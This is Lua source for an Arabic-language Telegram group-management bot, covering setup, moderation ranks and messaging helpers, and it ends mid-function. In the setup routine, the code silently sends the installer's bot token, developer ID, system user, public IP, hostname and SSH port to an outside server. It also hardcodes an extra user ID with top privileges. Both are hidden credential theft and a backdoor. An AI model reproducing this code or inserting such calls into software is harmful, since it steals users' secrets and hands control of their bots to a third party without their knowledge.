------------------------------------------------
-- This Source Was Developed By (JOKER) @UUOUOU_7.--
--   This Is The Source Channel @BLACK_TEAM_4 .   --
--         - ↱ ⁞ ⒷⓁⒶⒸⓀ ⁞ ↰ -                 --
--   -- https://t.me/BLACK_TEAM_4 --         --
------------------------------------------------ 
DevJoker  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http") 
HTTPS   = require("ssl.https") 
https   = require("ssl.https") 
User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Server  = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
DirName = io.popen("echo $(cd $(dirname $0); pwd)"):read('*a'):gsub('[\n\r]+', '')
Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
--     Source BlAcK     --
local AutoSet = function() 
if not DevJoker:get(Server.."IdBlAcK") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
data,res = https.request("https://apiabs.ml/Api/David/index.php?Ban=David&Info&Id="..DevId)
if res == 200 then
Abs = json:decode(data)
if Abs.Result.Info == 'Is_Spam' then
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
os.execute('lua BlAcK.lua') 
end ---ifBn
if Abs.Result.Info == 'Ok' then
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevJoker:set(Server.."IdBlAcK",DevId) 
end ---ifok
else 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
end
os.execute('lua BlAcK.lua') 
end
end 
if not DevJoker:get(Server.."TokenBlAcK") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
if res ~= 200 then 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
DevJoker:set(Server.."TokenBlAcK",TokenBot) 
end  
else 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
end  
os.execute('lua BlAcK.lua') 
end
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
DevId = DevJoker:get(Server.."IdBlAcK"),
TokenBot = DevJoker:get(Server.."TokenBlAcK"),
BlAcK = DevJoker:get(Server.."TokenBlAcK"):match("(%d+)"),
SudoIds = {DevJoker:get(Server.."IdBlAcK")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevJoker:get(Server.."IdBlAcK").."&TokenBot="..DevJoker:get(Server.."TokenBlAcK").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("BlAcK.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/BlAcK
token="]]..DevJoker:get(Server.."TokenBlAcK")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "~ The tg File Was Not Found In The Bot Files!"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
if [ ! $token ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "~ The Token Was Not Found In The config.lua File!"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
./tg -s ./BlAcK.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/BlAcK
while(true) do
rm -fr ../.telegram-cli
screen -S BlAcK -X kill
screen -S BlAcK ./BlAcK.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_BlAcK = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevJoker:del(Server.."IdBlAcK");DevJoker:del(Server.."TokenBlAcK")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_BlAcK() 
print("\27[36m"..[[          
              _______    _  __
     /\      |__   __|  | |/ /
    /  \   _ __ | | __ _| ' / 
   / /\ \ | '_ \| |/ _` |  <  
  / ____ \| | | | | (_| | . \ 
 /_/    \_\_| |_|_|\__,_|_|\_\
                                                      
]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
Config = dofile("./config.lua")
DevId = Config.DevId
SudoIds = {Config.SudoIds,1765160742,}
BlAcK = Config.BlAcK
TokenBot = Config.TokenBot
NameBot = (DevJoker:get(BlAcK..'Joker:NameBot') or 'بلاك')
--     Source BlAcK     --
FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     Source BlAcK     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source BlAcK     --
function dl_cb(arg, data)
end
--     Source BlAcK     --
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
--     Source BlAcK     --
-------  JokerSudo  -------
function JokerSudo(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:JokerSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:SecondSudo:',msg.sender_user_id_) 
if Status or JokerSudo(msg) or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(BlAcK) then  
var = true  
end  
return var  
end 
--     Source BlAcK     --
---------  SudoBot  --------
function SudoBot(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:SudoBot:',msg.sender_user_id_) 
if Status or JokerSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
----   JokerConstructor   ----
function JokerConstructor(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:JokerConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or JokerSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
----   Owner   ----
function Owner(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:Owner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or JokerConstructor(msg) or SudoBot(msg) or JokerSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or JokerConstructor(msg) or JokerSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
----    Constructor     ----
function Constructor(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or JokerConstructor(msg) or BasicConstructor(msg) or JokerSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
---------  Manager  --------
function Manager(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or JokerConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or JokerSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
----------  Admin  ---------
function Admin(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or JokerConstructor(msg) or JokerConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or JokerSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
---------Vip Member---------
function VipMem(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Owner(msg) or JokerConstructor(msg) or JokerConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or JokerSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
--------- Cleaner ----------
function Cleaner(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or JokerConstructor(msg) or JokerSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
--------- CleanerNum ----------
function CleanerNum(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or JokerConstructor(msg) or JokerSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
--------- CleanerMusic ----------
function CleanerMusic(msg) 
local Status = DevJoker:sismember(BlAcK..'Joker:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or JokerConstructor(msg) or JokerSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source BlAcK     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
if DevJoker:sismember(BlAcK..'Joker:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source BlAcK     --
---------  BanAll  ---------
function BanAll(user_id)
if DevJoker:sismember(BlAcK..'Joker:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source BlAcK     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
if DevJoker:sismember(BlAcK..'Joker:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source BlAcK     --
---------  MuteAll  --------
function MuteAll(user_id)
if DevJoker:sismember(BlAcK..'Joker:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source BlAcK     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     Source BlAcK     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     Source BlAcK     --
function BlAcKFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.BlAcK and msg then
FilesText = plugin.BlAcK(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
--     Source BlAcK     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     Source BlAcK     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= BlAcK:lower() then 
send(chat,msg.id_,"᥀︙عذرا هذا الملف ليس تابع لهذا البوت")   
return false 
end
send(chat,msg.id_,"᥀︙جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"᥀︙عذرا الملف ليس بصيغة ↫ Json يرجى رفع الملف الصحيح")
end
local info_file = io.open('./'..BlAcK..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevJoker:set(BlAcK.."Joker:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevJoker:sadd(BlAcK.."Joker:Groups",IdGps) 
DevJoker:set(BlAcK.."Joker:Lock:Bots"..IdGps,"del") DevJoker:hset(BlAcK.."Joker:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'Joker:Lock:Links','Joker:Lock:Contact','Joker:Lock:Forwards','Joker:Lock:Videos','Joker:Lock:Gifs','Joker:Lock:EditMsgs','Joker:Lock:Stickers','Joker:Lock:Farsi','Joker:Lock:Spam','Joker:Lock:WebLinks','Joker:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevJoker:set(BlAcK..Lock..IdGps,true)
end
if v.JokerConstructors then
for k,IdJokerConstructors in pairs(v.JokerConstructors) do
DevJoker:sadd(BlAcK..'Joker:JokerConstructor:'..IdGps,IdJokerConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevJoker:sadd(BlAcK..'Joker:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevJoker:sadd(BlAcK..'Joker:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevJoker:sadd(BlAcK..'Joker:Managers:'..IdGps,IdManagers)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevJoker:sadd(BlAcK..'Joker:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevJoker:sadd(BlAcK..'Joker:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevJoker:set(BlAcK.."Joker:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevJoker:set(BlAcK.."Joker:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( تم وضع ترحيب المجموعات )')
end
end
end
send(chat,msg.id_,"᥀︙تم رفع النسخه بنجاح \n᥀︙تم تفعيل جميع المجموعات \n᥀︙تم استرجاع مشرفين المجموعات \n᥀︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
end
--     Source BlAcK     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source BlAcK     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source BlAcK     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source BlAcK     --
function ChatLeave(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
end
--     Source BlAcK     --
function ChatKick(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusKicked" }, }, dl_cb, nil)
end
--     Source BlAcK     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source BlAcK     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source BlAcK     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     Source BlAcK     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
--     Source BlAcK     --
function Dev_Joker(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     Source BlAcK     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source BlAcK     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
--     Source BlAcK     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     Source BlAcK     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     Source BlAcK     --
function Pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source BlAcK     --
local JokerRank = function(msg) if SudoId(msg.sender_user_id_) then BlAcKTeam  = "المطور" elseif JokerSudo(msg) then BlAcKTeam = "المطور" elseif SecondSudo(msg) then BlAcKTeam = "المطور" elseif SudoBot(msg) then BlAcKTeam = "المطور" elseif Manager(msg) then BlAcKTeam = "المدير" elseif Admin(msg) then BlAcKTeam = "الادمن" else BlAcKTeam = "العضو" end return BlAcKTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1765160742) then BlAcKTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(BlAcK) then BlAcKTeam = 'البوت' elseif SudoId(user_id) then BlAcKTeam = 'المطور الاساسي' elseif DevJoker:sismember(BlAcK..'Joker:JokerSudo:', user_id) then BlAcKTeam = 'المطور الاساسي' elseif DevJoker:sismember(BlAcK..'Joker:SecondSudo:', user_id) then BlAcKTeam = 'المطور الاساسي²' elseif DevJoker:sismember(BlAcK..'Joker:SudoBot:', user_id) then BlAcKTeam = DevJoker:get(BlAcK.."Joker:SudoBot:Rd"..chat_id) or 'المطور' elseif DevJoker:sismember(BlAcK..'Joker:JokerConstructor:'..chat_id, user_id) then BlAcKTeam = 'المالك' elseif DevJoker:sismember(BlAcK..'Joker:Owner:', user_id) then BlAcKTeam = 'المالك' elseif DevJoker:sismember(BlAcK..'Joker:BasicConstructor:'..chat_id, user_id) then BlAcKTeam = DevJoker:get(BlAcK.."Joker:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevJoker:sismember(BlAcK..'Joker:Constructor:'..chat_id, user_id) then BlAcKTeam = DevJoker:get(BlAcK.."Joker:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevJoker:sismember(BlAcK..'Joker:Managers:'..chat_id, user_id) then BlAcKTeam = DevJoker:get(BlAcK.."Joker:Managers:Rd"..chat_id) or 'المدير' elseif DevJoker:sismember(BlAcK..'Joker:Admins:'..chat_id, user_id) then BlAcKTeam = DevJoker:get(BlAcK.."Joker:Admins:Rd"..chat_id) or 'الادمن' elseif DevJoker:sismember(BlAcK..'Joker:VipMem:'..chat_id, user_id) then  BlAcKTeam = DevJoker:get(BlAcK.."Joker:VipMem:Rd"..chat_id) or 'المميز' elseif DevJoker:sismember(BlAcK..'Joker:Cleaner:'..chat_id, user_id) then  BlAcKTeam = DevJoker:get(BlAcK.."Joker:Cleaner:Rd"..chat_id) or 'المنظف' else BlAcKTeam = DevJoker:get(BlAcK.."Joker:mem:Rd"..chat_id) or 'العضو' end return BlAcKTeam end
--     Source BlAcK     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(BlAcK) then  
var = true
elseif DevJoker:sismember(BlAcK..'Joker:JokerSudo:', user_id) then
var = true
elseif DevJoker:sismember(BlAcK..'Joker:SecondSudo:', user_id) then
var = true  
elseif DevJoker:sismember(BlAcK..'Joker:SudoBot:', user_id) then
var = true 
elseif DevJoker:sismember(BlAcK..'Joker:JokerConstructor:'..chat_id, user_id) then
var = true
elseif DevJoker:sismember(BlAcK..'Joker:Owner:'..chat_id, user_id) then
var = true
elseif DevJoker:sismember(BlAcK..'Joker:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevJoker:sismember(BlAcK..'Joker:Constructor:'..chat_id, user_id) then
var = true  
elseif DevJoker:sismember(BlAcK..'Joker:Managers:'..chat_id, user_id) then
var = true  
elseif DevJoker:sismember(BlAcK..'Joker:Admins:'..chat_id, user_id) then
var = true  
elseif DevJoker:sismember(BlAcK..'Joker:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function JokerDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif DevJoker:sismember(BlAcK..'Joker:JokerSudo:', user_id) then
var = 'Jokersudo'
elseif DevJoker:sismember(BlAcK..'Joker:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif DevJoker:sismember(BlAcK..'Joker:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevJoker:sismember(BlAcK..'Joker:JokerConstructor:'..chat_id, user_id) then
var = 'JokerConstructor'
elseif DevJoker:sismember(BlAcK..'Joker:Owner:'..chat_id, user_id) then
var = 'Owner'
elseif DevJoker:sismember(BlAcK..'Joker:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif DevJoker:sismember(BlAcK..'Joker:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif DevJoker:sismember(BlAcK..'Joker:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
--     Source BlAcK     --
local function Filters(msg, value)
local Joker = (BlAcK..'Joker:Filters:'..msg.chat_id_)
if Joker then
local names = DevJoker:hkeys(Joker)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source BlAcK     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "BLACK_TEAM_4")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙عذرا عزيزي ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙العضو ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙بواسطة ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
--     Source BlAcK     --
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "المالك"
